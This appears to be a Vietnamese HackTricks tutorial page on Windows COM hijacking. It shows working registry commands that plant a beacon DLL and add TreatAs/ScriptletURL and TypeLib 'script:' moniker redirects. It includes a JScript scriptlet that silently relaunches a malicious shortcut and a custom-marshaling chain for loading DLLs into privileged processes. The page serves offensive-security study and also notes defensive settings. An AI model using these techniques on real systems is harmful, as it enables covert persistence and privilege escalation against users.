# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Tìm kiếm các component COM không tồn tại

Vì người dùng có thể sửa đổi các giá trị HKCU, **COM Hijacking** có thể được dùng làm **cơ chế persistence**. Dùng `procmon`, bạn có thể dễ dàng tìm các registry COM được truy vấn nhưng chưa tồn tại và kẻ tấn công có thể tạo chúng. Các bộ lọc cơ bản:

- Các thao tác **RegOpenKey**.
- trong đó _Result_ là **NAME NOT FOUND**.
- và _Path_ kết thúc bằng **InprocServer32**.

Các biến thể hữu ích khi săn tìm:

- Tìm cả các key **`LocalServer32`** bị thiếu. Một số lớp COM là server chạy ngoài tiến trình và sẽ khởi chạy một EXE do kẻ tấn công kiểm soát thay vì một DLL.
- Ngoài `InprocServer32`, tìm các thao tác registry **`TreatAs`** và **`ScriptletURL`**. Nội dung phát hiện gần đây và các bài phân tích malware liên tục nhắc đến những mục này vì chúng hiếm hơn nhiều so với các đăng ký COM thông thường, do đó có tín hiệu cao.
- Khi sao chép một đăng ký vào HKCU, hãy dùng **`ThreadingModel`** hợp lệ từ `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Dùng sai model thường làm hỏng quá trình kích hoạt và khiến hành vi hijack dễ bị phát hiện.<sup>[[3]](#references)</sup>
- Trên hệ thống 64-bit, hãy kiểm tra cả chế độ xem 64-bit và 32-bit (`procmon.exe` và `procmon64.exe`, `HKLM\Software\Classes` và `HKLM\Software\Classes\WOW6432Node`) vì ứng dụng 32-bit có thể phân giải sang một đăng ký COM khác.

Sau khi quyết định sẽ giả mạo COM không tồn tại nào, hãy chạy các lệnh sau. _Hãy cẩn thận nếu bạn định giả mạo một COM được tải vài giây một lần, vì điều đó có thể là quá mức cần thiết._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Các thành phần COM của Task Scheduler có thể bị hijack

Windows Tasks sử dụng Custom Triggers để gọi các đối tượng COM. Vì chúng được thực thi thông qua Task Scheduler, nên việc dự đoán thời điểm chúng được kích hoạt sẽ dễ dàng hơn.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Dựa trên kết quả, bạn có thể chọn một tác vụ sẽ được thực thi **mỗi khi người dùng đăng nhập**, chẳng hạn.

Sau đó, tìm CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** trong **HKEY\CLASSES\ROOT\CLSID**, HKLM và HKCU. Thông thường, bạn sẽ thấy giá trị này không tồn tại trong HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Sau đó, bạn chỉ cần tạo mục HKCU và mỗi khi người dùng đăng nhập, backdoor của bạn sẽ được kích hoạt.

## Đăng ký COM bị treo và Custom Marshaling

Một đăng ký COM trên toàn máy có thể trở thành primitive DLL planting mà không cần thay đổi registry. Hãy tìm giá trị `InprocServer32` trỏ đến một DLL không tồn tại và có đường dẫn cuối cùng mà người dùng có quyền thấp có thể tạo hoặc sửa đổi. Đặt DLL đúng tên vào đó sẽ khiến mọi tiến trình kích hoạt CLSID tải mã của kẻ tấn công. Trong ví dụ CrossDevice, đường dẫn đã đăng ký là `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, vì vậy người dùng thông thường có thể tạo thư mục con và DLL còn thiếu.<sup>[[5]](#references)</sup>

### `IMarshal` như một primitive tải DLL giữa các tiến trình

Thông thường, COM biểu diễn con trỏ interface bằng một `OBJREF` tiêu chuẩn, tham chiếu bên nhận về đối tượng gốc. Một đối tượng triển khai `IMarshal` có thể tạo ra một `OBJREF` tùy chỉnh. Phương thức `GetUnmarshalClass` cung cấp CLSID của mã sẽ tái tạo đối tượng trong tiến trình nhận. CLSID đó không cần xác định đối tượng gốc. COM phân giải nó thành một máy chủ trong tiến trình và tải DLL đã đăng ký trước khi chuyển tiếp lời gọi phương thức interface được yêu cầu.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Một triển khai độc hại tối giản chỉ cần thay CLSID bị treo trong `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Truyền đối tượng này qua một tham số của phương thức được proxy, chẳng hạn `[in] IUnknown *`. Một lựa chọn khác là `CoGetInstanceFromIStorage`, trong đó đối tượng được custom-marshaled cũng triển khai đủ `IStorage` để vượt qua các kiểm tra cục bộ. Quá trình unmarshaling tự động trong server từ xa sẽ phân giải CLSID đã bị thay thế, khiến DLL được nạp trước khi phương thức đích chạy.<sup>[[5]](#references)</sup>

Primitive này không chỉ áp dụng cho các đăng ký bị thiếu. Nó cũng có thể buộc bên nhận nạp một DLL custom-unmarshaler hiện có và làm lộ các lỗi trong quá trình nạp hoặc unmarshaling của DLL đó.<sup>[[5]](#references)</sup>

Chuỗi khai thác cần tất cả các điều kiện sau:<sup>[[5]](#references)</sup>

1. Một CLSID có thể được máy truy cập trỏ đến một DLL in-process bị thiếu hoặc có thể thay thế.
2. Kẻ tấn công có thể đặt DLL đó vào đường dẫn được phân giải.
3. Một COM server out-of-process có thể được kích hoạt và chạy ở mức đặc quyền mong muốn.
4. Server chấp nhận custom marshaling và có một lời gọi được proxy để truyền đối tượng của kẻ tấn công qua ranh giới tiến trình.

### Tìm các in-process server có đăng ký bị treo

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) và [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) có thể liệt kê cơ sở dữ liệu COM của máy và kiểm tra từng server thông qua cơ chế phân giải module Win32 thông thường. Cách này tốt hơn `Test-Path` vì một số đăng ký chỉ chứa tên tệp và dựa vào đường dẫn tìm kiếm của loader.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Hãy xem kết quả là danh sách ứng viên, không phải bằng chứng có thể khai thác. Phân giải đường dẫn như loader thực hiện, sau đó kiểm tra DACL trên thư mục cha đầu tiên tồn tại và trên DLL dự kiến nếu DLL đó đã tồn tại. Tệp bị thiếu chỉ hữu ích khi attacker có thể tạo hoặc thay thế đường dẫn mà COM thực sự phân giải.<sup>[[5]](#references)</sup>

### Chọn và khởi chạy tiến trình nhận có đặc quyền

Kiểm tra các lớp COM ứng viên để tìm `RunAs`, liên kết với dịch vụ, các interface khả dụng và RPC proxy. Một lớp được cấu hình chạy dưới quyền `SYSTEM` nhưng không được hỗ trợ bởi dịch vụ có tên có thể không kích hoạt trực tiếp được vì RPCSS không thể khởi chạy nó. Trong trường hợp đó, hãy tìm một trigger không có đặc quyền để khởi chạy host của nó, chẳng hạn như scheduled task có thể thực thi, và tái tạo mọi điều kiện tiên quyết về named event hoặc IPC giúp server tiếp tục chạy.<sup>[[5]](#references)</sup>

Ví dụ, chuỗi Shell Create Object Handler dễ bị tấn công đã khởi chạy host bằng cách tạo global event như mong đợi trước khi gọi scheduled task có thể thực thi bởi người dùng.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Ánh xạ object reference thu được trở lại host của nó và xác minh cả danh tính lẫn chính sách marshaling. Sau đó, liệt kê các interface và chuyển đổi proxy của chúng sang IDL để tìm một tham số đầu vào như `IUnknown *` có thể marshal fake object.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Bảo vệ custom marshaling

Một bên nhận phù hợp không được từ chối các custom marshaler không đáng tin cậy. Có hai cơ chế bảo vệ trên toàn tiến trình: `EOAC_NO_CUSTOM_MARSHAL` trong các capability truyền cho `CoInitializeSecurity` và `COMGLB_UNMARSHALING_POLICY_STRONG` được thiết lập thông qua `IGlobalOptions::Set`. Khi có symbols, có thể kiểm tra trạng thái tương ứng trong `combase!gCapabilities` và `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager hiển thị kết quả dưới dạng `CustomMarshalAllowed` nếu trình phân tích tiến trình hỗ trợ bản dựng Windows đó.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` cho phép một CLSID được mô phỏng bởi một CLSID khác.<sup>[[4]](#references)</sup> Từ góc độ tấn công, điều này có nghĩa là bạn có thể giữ nguyên CLSID gốc, tạo một CLSID per-user thứ hai trỏ đến `scrobj.dll`, rồi chuyển hướng đối tượng COM thực sang đối tượng độc hại bằng `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Cách này hữu ích khi:

- ứng dụng mục tiêu đã khởi tạo một CLSID ổn định khi đăng nhập hoặc khi khởi động ứng dụng
- bạn muốn chuyển hướng chỉ bằng registry thay vì thay thế `InprocServer32` gốc
- bạn muốn thực thi một scriptlet `.sct` cục bộ hoặc từ xa thông qua giá trị `ScriptletURL`

Quy trình ví dụ (được điều chỉnh từ tradecraft công khai của Atomic Red Team và các nghiên cứu cũ hơn về lạm dụng registry COM):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Ghi chú:

- `scrobj.dll` đọc giá trị `ScriptletURL` và thực thi `.sct` được tham chiếu, vì vậy bạn có thể lưu payload dưới dạng tệp cục bộ hoặc tải tệp từ xa qua HTTP/HTTPS.
- `TreatAs` đặc biệt hữu ích khi đăng ký COM gốc đã đầy đủ và ổn định trong HKLM, vì bạn chỉ cần một redirect nhỏ cho từng người dùng thay vì sao chép toàn bộ cây khóa.
- Để xác thực mà không cần chờ trigger tự nhiên, bạn có thể khởi tạo thủ công ProgID/CLSID giả bằng `rundll32.exe -sta <ProgID-or-CLSID>` nếu lớp đích hỗ trợ kích hoạt STA.

## COM TypeLib Hijacking (script: persistence bằng moniker)

Type Library (TypeLib) định nghĩa các giao diện COM và được tải thông qua `LoadTypeLib()`. Khi một COM server được khởi tạo, hệ điều hành cũng có thể tải TypeLib liên quan bằng cách tra cứu các khóa registry bên dưới `HKCR\TypeLib\{LIBID}`. Nếu đường dẫn TypeLib được thay bằng một **moniker**, chẳng hạn `script:C:\...\evil.sct`, Windows sẽ thực thi scriptlet khi phân giải TypeLib — tạo ra persistence kín đáo, được kích hoạt khi các thành phần phổ biến được sử dụng.

Kỹ thuật này đã được quan sát thấy trên Microsoft Web Browser control (thường được Internet Explorer, các ứng dụng nhúng WebBrowser và thậm chí cả `explorer.exe` tải).<sup>[[1]](#references)[[2]](#references)</sup>

### Các bước (PowerShell)

1) Xác định TypeLib (LIBID) được một CLSID có tần suất sử dụng cao dùng đến. Ví dụ về CLSID thường bị các chuỗi malware khai thác: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Trỏ đường dẫn TypeLib của người dùng đến một scriptlet cục bộ bằng moniker `script:` (không cần quyền admin):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Thả một file JScript `.sct` tối giản để khởi chạy lại payload chính của bạn (ví dụ: một file `.lnk` được dùng trong chuỗi ban đầu):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Kích hoạt – mở IE, một ứng dụng nhúng điều khiển WebBrowser, hoặc thậm chí hoạt động Explorer thông thường sẽ tải TypeLib và thực thi scriptlet, kích hoạt lại chuỗi khi đăng nhập/khởi động lại.

Dọn dẹp
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Ghi chú
- Bạn có thể áp dụng logic tương tự cho các thành phần COM có tần suất sử dụng cao khác; luôn xác định `LIBID` thực tế trước tiên từ `HKCR\CLSID\{CLSID}\TypeLib`.
- Trên hệ thống 64-bit, bạn cũng có thể tạo khóa con `win64` cho các ứng dụng 64-bit.

## References

- [1] [Chiếm quyền TypeLib – Kỹ thuật duy trì COM mới (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – Chiến dịch ZipLine: Cuộc tấn công lừa đảo tinh vi nhắm vào các công ty Hoa Kỳ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Xem xét lại việc chiếm quyền COM (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Khóa CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Kỹ thuật khai thác Windows: Đăng ký đối tượng COM bị treo](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - Giao diện IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - OBJREF của MS-DCOM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
{{#include ../../banners/hacktricks-training.md}}

